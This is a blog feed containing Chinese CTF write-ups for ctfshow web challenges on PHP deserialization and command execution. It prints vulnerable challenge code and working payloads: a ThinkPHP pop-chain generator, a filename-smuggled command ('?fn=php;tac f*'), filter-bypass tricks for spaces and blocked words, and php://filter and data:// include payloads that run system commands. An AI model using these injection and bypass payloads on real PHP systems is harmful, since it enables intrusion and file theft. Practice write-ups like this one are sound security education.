class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​然后，将生成的 payload 放在下面的 payload 处：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=payload<span class="built_in">&amp;</span>lin=tac /f*</span><br></pre></td></tr></table></figure><p>​即可得到 flag。</p><h1 id="web275"><a class="markdownIt-Anchor" href="#web275">#</a> web275：</h1><p>​小声嘀咕：为什么还没有 pop 链？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>​想办法触发 <code>__destruct</code>  即可，这里需要 filename 或者 filecontent 包含 php 或者 flag，这样在最后销毁的时候会进入 system 函数，并且 checkevil () 为 true，不会进入 if 语句，程序会进入最后的销毁阶段，触发 <code>__destruct</code> ，因此，即可进入 system 函数，所以 payload 为：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fn=php;tac f*</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一些基础&quot;&gt;#&lt;/a&gt; 一些基础：&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;private 变量会被序列化为：&#92;x00 类名 &#92;x00 变量名&lt;br&gt;
 protected 变量</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-命令执行</title>
    <link href="http://blog.g01den.top/posts/53e2b2e1.html"/>
    <id>http://blog.g01den.top/posts/53e2b2e1.html</id>
    <published>2024-09-16T13:04:45.000Z</published>
    <updated>2024-09-17T06:11:14.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web29"><a class="markdownIt-Anchor" href="#web29">#</a> Web29：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​过滤了文件关键词，通配符绕过，cat f*，用 system 执行，发现没有成功读取，考虑使用 tac 倒序读取，得到 flag。</p><p>​<strong>总结，文件关键词过滤可以考虑使用通配符绕过。</strong></p><h1 id="web30"><a class="markdownIt-Anchor" href="#web30">#</a> Web30：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​过滤了 system，并且用的屎 eval 函数。</p><p>​这里先试试反斜杠绕过，似乎无法绕过。</p><p>​那么就试着反引号绕过，echo `ls`; ，成功绕过，之后直接 echo `tac fl*`; 读取 flag。</p><h1 id="web31"><a class="markdownIt-Anchor" href="#web31">#</a> Web31：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里发现空格，单引号被过滤了，还有小数点，没有过滤反引号，直接反引号绕过，成功绕过 system，cat 被过滤就 tac 读取，空格用 %0a 或者 %09 绕过。</p><p>​前置知识：</p><p><strong>空格过滤：</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%09 符号需要php环境</span></span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat<span class="built_in">$</span>&#123;IFS&#125;flag.txt</span><br><span class="line">cat<span class="built_in">$</span>IFS<span class="built_in">$</span>9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=<span class="built_in">$</span>&#x27;<span class="keyword">\x</span>20flag.txt&#x27;<span class="built_in">&amp;</span><span class="built_in">&amp;</span>cat<span class="built_in">$</span>kg</span><br><span class="line">(<span class="keyword">\x</span>20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure><p><strong>cat 过滤：</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure><h1 id="web32"><a class="markdownIt-Anchor" href="#web32">#</a> Web32：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​过滤了 system 和反引号还有 echo，这里看似挺严格的，但是 print_r 或者 var_dump 没有过滤，应该可以利用下，但是，system 被过滤了，只有无回显 RCE 了，但是，过滤了左半边括号，这样就没法绕了，试一试不需要括号的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">die</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;etc/passwd&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​<strong>可以配合文件包含来打伪协议，具体 payload 类似下面这样：</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&quot;<span class="built_in">$</span><span class="built_in">_</span>GET[url]&quot;?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web33"><a class="markdownIt-Anchor" href="#web33">#</a> Web33：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​多过滤了分号和双引号，反引号和空格等等依然被过滤了，这个时候似乎更难办了，还是打文件包含加伪协议来打：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web34"><a class="markdownIt-Anchor" href="#web34">#</a> Web34：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​多过滤了一个冒号，方法同上：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>​这里解释一下，这里出现冒号依旧绕过了的原因是因为 PHP 把前面的 include 到？&gt; 的认为成一个 get 传参，另一个，也就是 &amp; url 被认为是另一个传参，正则只检测第一个部分，第二个部分就不会检测了。</p><h1 id="web35"><a class="markdownIt-Anchor" href="#web35">#</a> Web35：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​小于符号也被过滤了，不过无伤大雅，依旧老样子，因为没有过滤 &gt;，所以依旧能用上面的 payload 打：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web36"><a class="markdownIt-Anchor" href="#web36">#</a> Web36：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​这里连带着数字一起过滤了，无伤大雅，继续文件包含一把梭：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web37"><a class="markdownIt-Anchor" href="#web37">#</a> Web37：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​文件包含过滤了 flag，这个时候可以考虑 include 一个 data 伪协议输入的命令参数，具体如下：</p><blockquote><p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行</p></blockquote><p>​<strong>第一：使用通配符绕过 flag：</strong></p><blockquote><p>?c=data://text/plain,<?php echo system('cat fl*');?><br>?c=data://text/plain,<?php%20 system('cat fl*');?></p></blockquote><p>​<strong>第二：使用 base64 绕过 flag：</strong></p><blockquote><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p><p>#base64 解码为 <code>&lt;?php system('cat flag.php');?&gt;</code></p></blockquote><h1 id="web38"><a class="markdownIt-Anchor" href="#web38">#</a> Web38：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ 